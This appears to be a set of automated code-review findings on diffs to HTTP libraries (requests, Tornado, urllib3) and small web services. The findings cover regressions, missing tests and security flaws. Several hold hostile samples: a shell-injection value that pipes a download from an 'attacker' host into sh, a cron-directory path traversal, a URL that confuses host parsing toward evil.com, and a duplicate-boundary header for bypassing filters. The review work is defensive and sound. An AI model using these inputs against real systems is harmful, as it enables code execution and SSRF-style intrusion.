findings.body: `send()` constructs a new `HTTPAdapter()` on every call, so each request builds its own connection pool and none are reused across requests on the same `Session` — the exact behaviour the `Session` existed to provide. At the same time `close()` (and therefore `__exit__`) was reduced to `pass`, so nothing ever clears those pools and their sockets are left to GC. Hold a single adapter on the session (created in `__init__`, replacing `init_poolmanager`) and have `close()` close it.

findings.title: New send/request path and gutted close() have no accompanying test changes
findings.body: This diff changes core session behavior: close() is reduced to `pass` (no longer clears the poolmanager, which the session no longer owns), request() is rewritten to build a Request/PreparedRequest and call self.send(), and send() now delegates to a new HTTPAdapter instead of request.send(). No test file appears in the diff, so nothing here would fail if these paths regress — e.g. if close() should release adapter-held connections, or if the new request()/send() flow drops a param like `cert`, `verify`, or `timeout` that old_request handled differently.

findings.title: `self.poolmanager` and `init_poolmanager()` removed while still referenced elsewhere
findings.body: `init_poolmanager()` was a documented extension point for subclasses (overriding it to customise pool size / SSL behaviour) and `self.poolmanager` was read by the transport code that `old_request` still reaches via `r.send()`. After this change a `Session` has no `poolmanager` attribute at all, so subclasses overriding `init_poolmanager` stop being called and any `session.poolmanager` access raises `AttributeError`. The now-unused `PoolManager` import on line 19 is a hint the removal is incomplete. Confirm no remaining reader of `Session.poolmanager` before landing.

findings.title: Unqualified `from adapters import ...` allows module shadowing
findings.body:
Every other intra-package import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import ...`), but this one is absolute. Under absolute-import semantics it resolves against `sys.path` rather than the `requests` package, so a top-level `adapters` module anywhere earlier on `sys.path` — including the process working directory in many deployments — is imported instead of `requests/adapters.py`, and its `HTTPAdapter.send()` then handles every request the session makes.

Change it to `from .adapters import HTTPAdapter` so the intended module is unambiguous.

Adversary: anyone who can drop a file into a directory on the application's `sys.path` (a shared deploy directory, a writable CWD, a sloppily-scoped site-packages). What they get: control of the HTTP transport for the whole process. The reach is limited — such write access is often already severe on its own — hence minor rather than higher.

findings.title: cookies property returns None on parse failure, breaking callers
findings.body:
In the old `RequestHandler.cookies`, a failed `SimpleCookie.load()` called `self.clear_all_cookies()` and still returned the (empty) `SimpleCookie` instance, so callers always got a mapping. The moved version sets `self._cookies = None` and returns it. Both surviving callers assume a mapping: `get_cookie` does `if name in self.request.cookies` (TypeError: argument of type 'NoneType' is not iterable) and `clear_all_cookies` does `self.request.cookies.iterkeys()` (AttributeError). Because `_cookies` is cached, every subsequent access on that request also returns None, so any request with a malformed Cookie header will 500 as soon as any cookie is read. Reset to an empty `Cookie.SimpleCookie()` in the except branch instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None -> TypeError on every read

findings.title: RequestHandler.cookies removed with no backwards-compatible alias
findings.body: `RequestHandler.cookies` was a public, documented attribute; application handlers and third-party code commonly read `self.cookies` directly. The diff deletes it outright rather than leaving a thin forwarding property (`return self.request.cookies`), so every external caller raises AttributeError. Keep the property on RequestHandler delegating to `self.request.cookies`.

findings.title: Untested behavior change: malformed Cookie header now yields None
findings.body: The new HTTPRequest.cookies property sets self._cookies = None when Cookie.SimpleCookie().load() raises, whereas the old RequestHandler.cookies property called self.clear_all_cookies() on the same exception path. Consumers such as get_cookie (tornado/web.py:321) and clear_all_cookies (tornado/web.py:367) now do `name in self.request.cookies` / `self.request.cookies.iterkeys()`, which will raise a TypeError if cookies is None. No test exercises a malformed 'Cookie' header to catch this regression.

findings.title: Malformed Cookie header no longer triggers clear_all_cookies
findings.body: Previously, an unparsable Cookie header caused `clear_all_cookies()` to be invoked, instructing the browser to drop the bad cookies so the client could recover on the next request. The moved property in httpserver.py cannot call back into the handler, so that self-healing behaviour silently disappears and clients with a corrupt cookie jar stay broken. If the recovery behaviour is intended to be kept, it needs to be re-added at the RequestHandler level (e.g. detect an empty/failed parse in `RequestHandler.prepare` or a wrapper).

findings.title: Parameter names not stripped, so `boundary=` is never matched
findings.body:
`content_type.split(";")` leaves the leading space that virtually every client emits: `multipart/form-data; boundary=----WebKitFormBoundaryX` splits into `['multipart/form-data', ' boundary=----WebKitFormBoundaryX']`. The second element partitions to `k == ' boundary'`, which fails the `k == "boundary"` test, the loop never breaks, and the `for ... else` branch logs "Invalid multipart/form-data" instead of parsing the body. The previous code used the substring test `'boundary=' in content_type`, which tolerated the whitespace, so this is a regression that silently drops every multipart upload.

Strip each segment before splitting it, e.g. `k, sep, v = field.strip().partition("=")`. While touching this, consider also stripping surrounding double quotes from `v`, since RFC 2046 permits `boundary="..."` and the raw value would otherwise be passed to `_parse_mime_body` with the quotes attached.

findings.title: No test covers boundary parsing when boundary isn't the last Content-Type param
findings.body: The change fixes a real bug (assuming 'boundary' is the last parameter in the Content-Type header) but no test is included. If this logic regresses — e.g. the for/else fallthrough stops correctly triggering the 'Invalid multipart/form-data' warning, or boundary values with a trailing charset param are mis-parsed — nothing in the existing test suite (not shown, and none added here) would catch it.

findings.title: Content-Type parameter not stripped/unquoted before MIME boundary use
findings.body:
Entry point: the client-supplied `Content-Type` request header. Sink: `self._parse_mime_body(v, data)` on line 364.

`content_type.split(";")` yields parameters with their leading OWS intact, and `field.partition("=")` is applied without `strip()`. For the ordinary, RFC-compliant header `multipart/form-data; boundary=abc` the token is `" boundary"`, so `k == "boundary"` is false, the loop falls through to the `else` on line 366, and the entire multipart body is silently discarded with only a warning. The quoted form `boundary="abc"` (also RFC-legal) matches but passes `"abc"` including quote characters to the parser.

Beyond the plain functional breakage, the security-relevant consequence is a parser differential: a proxy, WAF or framework in front of Tornado will extract a boundary and inspect the body, while Tornado extracts none and leaves `request.arguments`/`files` empty — so handlers see a different request than the thing that inspected it. Applying `field.strip().partition("=")` and stripping surrounding quotes from `v` closes both.

I can name what the attacker controls (the full Content-Type header) and the sink, but not a concrete privilege gain, which is why this is filed as minor rather than major.

findings.title: get_host() ignores '?' and '#', so host can differ from urlsplit()
findings.body:
`get_host()` splits on `://`, then `/`, then `@`, then `:`. It never truncates the authority at a `?` (query) or `#` (fragment) delimiter, so those characters are treated as ordinary host characters and any `@` appearing after them is taken as a userinfo separator.

For `http://google.com#@evil.com/` the authority per RFC 3986 (and per `urllib.parse.urlsplit`) is `google.com`, but this function returns `('http', 'evil.com', None)`. Same for `http://google.com?@evil.com`.

Consequence: any caller that validates a URL's host with a standards-compliant parser (an allowlist check, an SSRF guard) and then hands the *string* to urllib3 will connect to a host the validator never saw. The same divergence applies to a `Location:` header followed on redirect, where the URL is supplied by the remote server.

Fix: truncate the authority at the first `?` or `#` before the `@`/`:` splits (or delegate to `urlsplit`), so that `get_host` agrees with the standard parser on which host is being contacted.

findings.title: New util.py helpers have no test coverage in this diff
findings.body: make_headers, get_host, and is_connection_dropped are newly added (lifted) with nontrivial logic (accept_encoding normalization, basic auth encoding, URL parsing with error raising, poll/select branching) but no test file is included in the diff. If any of these functions regress during the refactor (e.g. get_host mishandling ports, make_headers producing wrong headers, is_connection_dropped picking the wrong branch), nothing in this change would catch it.

findings.title: LocationParseError message never interpolates the URL
findings.body: The format string `"Failed to parse: %s"` has no `%` operand, so the raised exception literally reads `Failed to parse: %s` and the caller loses the only piece of diagnostic information the error exists to carry. Change it to `raise LocationParseError("Failed to parse: %s" % url)` (or include the original url before the splits, which is arguably more useful since `url` has already been stripped of scheme, path and auth by this point).

findings.title: is_connection_dropped falls off the end and returns inconsistent types
findings.body: The docstring promises "Returns True if the connection is dropped", but the function has two divergent return shapes: the `select` branch returns a *list* (`select(...)[0]`), and the `poll` branch returns `True` only from inside the loop — if `p.poll(0.0)` yields nothing, or yields only descriptors that don't match `conn.sock.fileno()`, control falls off the end and the function returns `None`. Truthiness happens to make `if is_connection_dropped(conn):` work today, but any caller doing `is True`, `is False`, or logging/serialising the result gets something unexpected. Add an explicit `return False` after the loop and coerce the select branch to a bool.

findings.title: Unicode accept_encoding on Python 2 is silently replaced with 'gzip,deflate'
findings.body: The type dispatch checks `isinstance(accept_encoding, str)` and `isinstance(accept_encoding, list)`; anything else falls into the `else` branch and is overwritten with `'gzip,deflate'`. On Python 2 a `unicode` string (very common under `from __future__ import unicode_literals`) matches neither branch, so a caller passing `u'identity'` silently gets `gzip,deflate` instead — the opposite of what they asked for. Since the module already imports `six` (line 16), use `isinstance(accept_encoding, six.string_types)`. Tuples/other sequences have the same silent-fallback problem.

findings.title: No test that 'status' sort key actually maps and works
findings.body: SORTABLE includes 'status' as a valid key, but no test exercises sort='status'. If the mapping were wrong or broken for that column, nothing would catch it. Given the existing tests already cover 'created_at' (default) and 'amount', adding a similar case for 'status' would close the gap.

findings.title: describe() has no visible test to catch narrowing regressions
findings.body: The diff removes explicit casts and relies on TypeScript's discriminated-union narrowing for `event.kind`. No test file is included in this PR, so if the `Event` type definition changes (e.g., a new variant added, or `kind` values renamed) in a way that breaks narrowing or produces wrong output at runtime, nothing here would fail until manually exercised. Since no test coverage for this module is visible in the diff or retrieved context, this is a soft observation rather than a strict regression from existing coverage.

findings.title: `self.location` now a URL object, breaking documented string contract
findings.body:
Previously `self.location` was assigned the raw `location` argument; now it is assigned `URL(location)`. The documented contract (`docs/web_reference.rst`) states the attribute is "the location the response redirects to, **as the string it was constructed with**" and that application code compares it against configured strings and passes it to `str.startswith`.

After this change:
- `exc.location.startswith(...)` raises `AttributeError` (`yarl.URL` has no `startswith`).
- `exc.location == "/login"` silently becomes `False`, since `URL.__eq__` does not compare equal to a `str` — a wrong result with no exception, which is harder to detect.
- Round-tripping is also lossy/normalising: `URL(location)` may percent-encode or otherwise normalise the input so even `str(exc.location)` need not equal the original argument.

If the goal is to avoid constructing the URL twice, keep the attribute as the original value and use a local:

```python
url = URL(location)
self.headers['Location'] = str(url)
self.location = location
```

If changing the attribute type is intentional, it is a breaking public API change and needs the documentation updated plus a changelog/deprecation note.

_Also raised by the security agent:_ `.location` type change can invert string-based redirect allowlist checks

_Also raised by the docs agent:_ self.location now holds a URL, contradicting documented string contract

findings.title: No test guards self.location's type/value contract
findings.body: self.location is now assigned URL(location) instead of the original string, which per docs/web_reference.rst is documented as being the string it was constructed with (application code relies on str.startswith against it). If this change is wrong, nothing in the diff or presumably the existing suite asserts that HTTPMove(location).location equals the original string or is str-comparable; a test exercising `.location` equality/`startswith` behavior for a redirect exception would catch this but is absent.

findings.title: readany can return empty bytes before EOF after single wait
findings.body:
`_wait()` resolves its waiter not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, which can happen with nothing added to the buffer — its own docstring says "a caller must re-check its condition after waking rather than assuming data arrived". Replacing the `while` with an `if` removes exactly that re-check: after a spurious/chunk-boundary wake, `self._buffer` is still empty and `self._eof` is still false, so `self._read_nowait(-1)` returns `b""`. Callers of `readany()` treat an empty result as end-of-stream, so this silently truncates the stream. Restore the `while` loop so the condition is re-evaluated after each wake.

_Also raised by the security agent:_ Single wait lets readany() return b'' before EOF, faking end-of-body

findings.title: No test covers spurious wake with empty buffer after change
findings.body: The change from `while` to `if` means readany() now only waits once instead of re-checking the condition until data actually arrives or EOF is reached. The retrieved docstring for `_wait` explicitly warns that the waiter can resolve with no new data in the buffer, so callers must re-check their condition after waking. This diff removes that re-check for readany(), but nothing in the diff (no test file included) exercises the scenario where `_wait` returns and the buffer is still empty and not at EOF — a case that would now cause `_read_nowait(-1)` to return no data prematurely instead of waiting further. If such a test existed and passed, it would catch this regression; since none is present, this behaviour change is currently uncovered.

findings.title: Implicit relative import breaks package import on Python 3
findings.body: `from adapters import HTTPAdapter` is not the same module reference as `from .adapters import HTTPAdapter`. Implicit relative imports were removed in Python 3 (PEP 328), so this statement resolves `adapters` as a top-level module on `sys.path`. Since `adapters.py` lives inside the `requests` package, the lookup fails and `import requests` raises `ModuleNotFoundError: No module named 'adapters'` at import time \u2014 every consumer of the library breaks, not just `Session`. Even on Python 2 this is a latent hazard: if any unrelated top-level `adapters` module is importable, it silently shadows the intended one and `HTTPAdapter` would be the wrong class. Restore the leading dot.

findings.title: Unqualified `import adapters` allows sys.path shadowing of HTTPAdapter
findings.body:
`from .adapters import HTTPAdapter` unambiguously resolves inside the `requests` package. `from adapters import HTTPAdapter` resolves through `sys.path`, so the module that ends up providing `HTTPAdapter` is whatever `adapters.py` / `adapters/` appears first on the path — the interpreter's script directory or CWD (`''`, present under Python 2 and for `python script.py` invocations), a `PYTHONPATH` entry, or any writable site-packages/shared directory.

Adversary: anyone who can drop a file named `adapters.py` into a directory that precedes `requests/` on `sys.path` — a local user on a shared host, a CI job that runs from a checkout of an untrusted repo, or an author of an unrelated top-level distribution that happens to ship a module called `adapters`. What they control: the entire `HTTPAdapter` implementation. What they get: `HTTPAdapter` is the object that performs TLS verification and connection handling for every `Session` request, so a substituted class can silently disable certificate verification, proxy traffic, or exfiltrate auth headers and request bodies — and its module body executes arbitrary code at `import requests` time.

Restore the explicit relative form (`from .adapters import HTTPAdapter`) or use the fully qualified `from requests.adapters import HTTPAdapter`. Either one pins resolution to the package and removes the hijack surface entirely.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
The PR's premise ("cookies is always a mapping after construction") contradicts the retrieved `HTTPRequest.cookies` property, which returns `None` when the `Cookie` header is present but unparseable and documents that "every consumer has to allow for that". With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client-supplied Cookie header into a 500 on any handler that calls `get_cookie` (including `get_secure_cookie`/XSRF paths). Restore the guard, or make the property return an empty mapping instead of `None` and update its docstring — but not one without the other.

_Also raised by the security agent:_ Malformed Cookie header makes get_cookie raise TypeError (remote 500)

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Dropping strip() breaks boundary detection for multipart bodies
findings.body: `content_type.split(";")` yields segments that keep the whitespace following each semicolon. For the canonical header `multipart/form-data; boundary=----WebKitFormBoundaryX`, the second segment is `" boundary=----WebKitFormBoundaryX"`, so `field.partition("=")` produces `k == " boundary"`. The comparison `k == "boundary"` on line 5 then fails, the loop falls through without ever calling `_parse_mime_body`, and the multipart body is silently discarded — all file uploads and form fields vanish. The strip was not redundant: it normalised both the parameter name and (via the trailing side) the value, which may also carry trailing whitespace or a stray `\r`. Restore `field.strip().partition("=")`, or at minimum strip `k` and `v` individually before the comparison.

findings.title: Dropping strip() on Content-Type params creates a boundary parser differential
findings.body:
`content_type` comes straight from the client's `Content-Type` request header, and each `;`-separated parameter is now matched with `field.partition("=")` instead of `field.strip().partition("=")`.

Consequences:

1. RFC 7231/9110 allow optional whitespace around parameters, and essentially every real client emits `multipart/form-data; boundary=----X` with a leading space. With the strip removed, `k` is `" boundary"`, the `if k == "boundary"` test fails, `_parse_mime_body` is never called, and the multipart body is silently discarded (uploads and body arguments vanish). Handlers that make decisions on body fields now see an empty body rather than an error.
2. The security-relevant half: an attacker who controls the header can send `multipart/form-data;boundary=A; boundary=B`. Any upstream that normalises whitespace (proxy, WAF, content-inspection gateway, or a differently-implemented backend) will parse the request with boundary `B`, while this code takes `A` — the inspecting component and the application read two different sets of form parts. That is the classic shape of a filter/scanner bypass, and it is introduced purely by removing normalisation.
3. `v` is also no longer trimmed, so `boundary=A ` yields a boundary with a trailing space that will not match the body delimiters.

Restore `field.strip()` (or strip `k` and `v` individually) before comparing.

findings.title: No test covers boundary parsing with leading-space field
findings.body: The change drops field.strip() before partition, meaning a field like " boundary=abc123" (typical after splitting on ";" in a header like "multipart/form-data; boundary=abc123") would now produce k == " boundary" instead of "boundary", causing the boundary check `k == "boundary"` to fail and multipart parsing to silently not find the boundary. No test in this diff (or apparently in the surrounding suite) exercises this exact case with a leading space, so this regression would not be caught.

findings.title: No test exercises the LocationParseError path to catch broken format string
findings.body: The change leaves a %s placeholder in the string with no argument, so calling this raise statement will throw 'TypeError: not enough arguments for format string' instead of the intended LocationParseError. There is no test in this diff (or apparently in the surrounding suite) that calls parse_url/split with a non-digit port to exercise this branch, so nothing would fail even though the exception type and message are now wrong.

findings.title: Dangling %s placeholder in LocationParseError message
findings.body: The format argument `% url` was removed but the `%s` conversion specifier remains in the string literal, so the raised error reads literally `Failed to parse: %s`. That is neither the shortened message the PR intends nor a message that identifies the offending URL, and anyone grepping logs or matching on the message gets a raw placeholder. If the goal is to shorten, drop the placeholder too (e.g. `raise LocationParseError(url)` or a bare static message); if the URL is still wanted, restore `% url`.

findings.title: Command injection in create_archive via shell=True f-string
findings.body:
`cmd` is built by interpolating `name` and `directory` directly into a shell string on line 9 and executed with `shell=True` on line 10. A value like `x; curl attacker/sh | sh` or `$(...)` in either argument runs as a separate command with the privileges of the process. Path traversal is also possible: `name = "../../etc/cron.d/x"` writes the tarball outside `/exports`.

Fix: drop the shell entirely and pass an argument list, as the existing `list_exports` on line 5 already does:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Additionally validate `name` against an allowlist (e.g. `^[A-Za-z0-9_-]+$`) and resolve `directory` to confirm it stays inside the intended root, so the archive path cannot escape `/exports`.

Adversary: whoever supplies the export name/directory — typically an API or CLI user requesting an export. What they control: the two string arguments. What they get: arbitrary command execution as the service user, or arbitrary file write via the path.

findings.title: Unquoted interpolation breaks for names/paths with spaces
findings.body:
`cmd` is assembled by f-string and handed to `shell=True`, so the shell word-splits the result. A perfectly ordinary input such as `directory="/data/my exports"` makes tar receive two operands (`/data/my` and `exports`) and fail or archive the wrong thing; `name="backup 2024"` writes `/exports/backup` and passes `2024.tar.gz` as an extra operand. Any shell metacharacter in either argument (`;`, `&&`, `$(...)`, `*`) likewise changes the command that runs rather than being treated as part of a path.

The fix is to drop the shell entirely and pass an argument list, matching the style already used by `list_exports` on line 5: `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`. Note that a `name` containing `/` or `..` still escapes `/exports/`, so validate `name` before building the path.

findings.title: No test coverage for create_archive
findings.body: The new create_archive function builds a shell command via string interpolation and executes it with shell=True. No test exists to verify correct behavior (e.g., that the archive is created at the expected path, that name/directory are handled correctly, or that malformed input is rejected). Since this shells out with unsanitized input, a test would also serve as a regression guard once input handling is fixed.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` allows any origin (`origin: "*"`) while also enabling `credentials: true`, in contrast to the existing middleware directly above which restricts to the `ALLOWED` list (line 6). Whatever routes this is mounted on become readable cross-origin by any website, using the victim's session cookies.

Adversary: the operator of any web page a logged-in user visits. What they control: a page that issues `fetch(api, {credentials: 'include'})`. What they get: the ability to read authenticated API responses (and to perform authenticated state-changing requests whose responses they can read, defeating CSRF token readback protections), scoped to the victim's session.

A note on exploitability: per the Fetch spec a browser rejects a literal `Access-Control-Allow-Origin: *` on a credentialed request, so depending on how the `cors` package emits the header this may currently fail closed — and the usual next step, when the dashboard doesn't work, is to switch to origin reflection (`origin: true` or a reflect-the-Origin callback), which is exactly the fully exploitable form. Either way the control is off by intent.

Fix: add the dashboard's origin to the `ALLOWED` list (or give `dashboardCors` an explicit origin string / allowlist function) and keep `credentials: true` only with that explicit allowlist. Never pair a wildcard or reflected origin with credentials.

findings.title: origin:"*" with credentials:true breaks credentialed requests
findings.body:
The `cors` middleware will emit the literal header `Access-Control-Allow-Origin: *` for this config. Per the Fetch spec, a browser making a request with `credentials: 'include'` (or `withCredentials: true`) rejects a wildcard ACAO and fails the request — the response is blocked and cookies are never sent or accepted. So this middleware achieves the exact opposite of the PR's stated intent ("so the new dashboard origin can call the API with cookies").

To make credentialed requests work, the origin must be reflected explicitly, e.g. `origin: DASHBOARD_ORIGIN` (or a function/allow-list that echoes the caller's origin only when it matches), keeping `credentials: true`. The existing config on line 6 already does this via `ALLOWED`; adding the dashboard origin to that list is the straightforward fix.

findings.title: New dashboardCors config has no test verifying its behavior
findings.body: dashboardCors combines origin: "*" with credentials: true. Browsers reject this combination (the Access-Control-Allow-Origin header cannot be '*' when credentials are allowed), so this configuration likely does not work as intended, or if a proxy/library silently reflects the origin, that behavior is unverified. No test exercises this exported middleware to check what headers it actually produces for a request. If the intent (e.g., reflecting a specific dashboard origin) is wrong, nothing in the change set would fail.

findings.title: Live AcmePay secret key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` is a production payment-provider credential committed to the repository, and line 8 now assigns it to `acmepay.api_key` in place of the previous `os.environ["ACMEPAY_SECRET_KEY"]` read. The `acme_live_` prefix indicates a live-mode key, not a sandbox one.

Adversary: anyone with read access to the repository or its history — contractors, CI log scrapers, anyone who forks or clones, and the public if the repo is ever open-sourced. They control nothing and still obtain a credential that can issue charges, issue refunds, and read customer/payment data through the AcmePay API.

Actions: (1) treat this key as compromised and rotate it at AcmePay immediately — removing the line in a follow-up commit does not undo disclosure since it stays in git history; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (the `import os` removal must be reverted too); (3) consider a secret-scanning pre-commit hook so a live-prefixed key cannot be committed again.

findings.title: Env-based key removed: all environments now use the live key
findings.body:
`client()` previously resolved the key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, which let each deployment (prod, staging, CI) supply its own credential and failed loudly with a `KeyError` when none was configured. After this change the key is a module-level literal prefixed `acme_live_`, so:

1. Any environment that still sets `ACMEPAY_SECRET_KEY` has that setting silently ignored — a configuration regression with no error surface.
2. Non-production environments and test runs that previously used a test key will now authenticate against the live account and can issue real charges.

Restore the environment lookup (`acmepay.api_key = os.environ["ACMEPAY_SECRET_KEY"]`) and re-add the `import os` that was deleted, keeping the fail-fast behaviour when the variable is absent. The literal on line 4 must also be treated as a compromised live credential and rotated, since it is now in version history.

findings.title: client() behavior change has no test exercising it
findings.body: The diff removes the os.environ lookup and switches client() to assign a hardcoded ACMEPAY_SECRET_KEY to acmepay.api_key. Only a fixture file (tests/fixtures/acmepay.py) was added, which defines fake_client() and TEST_KEY but contains no test function or assertion. Nothing in this PR calls client() and checks acmepay.api_key, so if this function were reverted, broken, or the wrong key wired in, no test would fail.

findings.title: tenant_of returns tenant id from an unverified, unexpired-unchecked token
findings.body:
`tenant_of` calls `jwt.decode(token, options={"verify_signature": False})`, so no signature check is performed and (in PyJWT, disabling signature verification also defaults the other claim checks off) expiry is not enforced either. The returned `tenant_id` is therefore whatever the caller of the API put in the token payload, which anyone can craft by base64-encoding a JSON body. Any authorisation or data-scoping decision made on this value lets a caller select an arbitrary tenant.

Use the verified path instead \u2014 `claims_for(token)["tenant_id"]`, which already decodes with `public_key()` and `algorithms=["RS256"]` on line 7 \u2014 and drop the unverified variant. If the intent was to avoid a key-store round-trip, cache `public_key()` rather than skipping verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: tenant_of() has no test covering its behavior
findings.body: The new tenant_of() function decodes a token without verifying its signature and extracts tenant_id. No test file is included in this diff, so there is nothing that would fail if this function returned the wrong tenant, raised on a missing claim, or was changed to (incorrectly) trust an unverified value in a new context. Given this function reads security-relevant data (tenant_id) from an unverified token, at minimum a test asserting correct extraction and behavior on a malformed/missing-claim token should exist.

findings.title: Missing tenant_id claim raises KeyError instead of an auth error
findings.body: The payload is indexed directly, so a token without a `tenant_id` claim (an old token, a service token, or a forged one) raises `KeyError` rather than an authentication/authorisation failure. Depending on the caller this surfaces as a 500 instead of a 401/403. Use `.get("tenant_id")` and raise a domain-specific error, or validate the claim's presence explicitly.

findings.title: tenant_of name doesn't disclose it skips signature verification
findings.body: tenant_of(token) explicitly passes verify_signature: False, but nothing in its name or a docstring signals that it returns an unverified/untrusted claim, especially sitting right next to claims_for(token) which does verify. A caller could reasonably assume tenant_of returns a value with the same trust level as claims_for and use it in a security-sensitive context. Renaming (e.g. unverified_tenant_of) or adding a one-line docstring noting the claim is unverified would prevent misuse.

findings.title: Missing require_owner check lets any user edit any payment method
findings.body:
`update_payment_method` resolves `pm` directly from the caller-supplied `pm_id` (line 12) and writes to it (lines 13-14) without ever calling `require_owner`. The adversary is any authenticated user of the service; what they control is the `pm_id` path/query parameter and the `billing_name` body field; what they get is write access to another account's saved payment method record — they can rewrite the billing name on a card they do not own, which is both a data-integrity breach and a plausible step toward fraud or social-engineering against the real cardholder.
